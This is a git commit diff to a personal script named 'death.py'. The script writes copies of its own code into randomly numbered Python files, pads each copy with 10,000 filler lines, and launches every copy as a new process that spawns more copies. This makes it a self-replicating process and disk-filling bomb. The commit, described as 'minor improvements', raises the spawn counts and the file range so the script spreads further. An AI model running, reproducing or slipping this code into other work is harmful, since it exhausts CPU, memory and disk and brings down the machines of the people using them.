73e93d389900d4464af2d742b70be19638c37547
Reclines <firethefox8342@gmail.com>
2023-04-01 16:27:45 -0400

    variable names to make the death script things easier to change and minor improvements

--- personal/death.py
+++ personal/death.py
@@ -3,8 +3,11 @@ import subprocess as s
 import multiprocessing as mp
 import os
 
-randoNum = 5
 name = os.path.splitext(os.path.basename(__file__))[0]
+
+randoNum = 60
+externalRunAmount = 5
+firstRunAmount = 10
 
 contents = f'''
 import {name} as m
@@ -13,27 +16,20 @@ import subprocess as s
 import multiprocessing as mp
 import os
 name = os.path.splitext(os.path.basename(__file__))[0]
-
 def runFile(i):
     filename = "python " + str(i) + ".py"
     s.Popen(filename, shell=False)
-
-
 def handleFile(i):
     file = os.getcwd() + "\\\\" + str(i) + ".py"
     if not os.path.isfile(file):
         m.writeFile(f"{{i}}.py", m.contents)
     runFile(i)
-
-
 def main():
-    for a in range(1):
-        i = r.randint(0, 10)
+    for a in range({externalRunAmount}):
+        i = r.randint(0, {randoNum})
         if __name__ == "__main__":
             mp.Process(target=handleFile, args=(i,)).start()
             print(name)
-
-
 main()
 ''' + "##################################################\n" * 10000
 
@@ -60,7 +56,7 @@ def handleFile(i):
 
 
 def main():
-    for a in range(1):
+    for a in range(firstRunAmount):
         i = r.randint(0, randoNum)
         mp.Process(target=handleFile, args=(i,)).start()
 
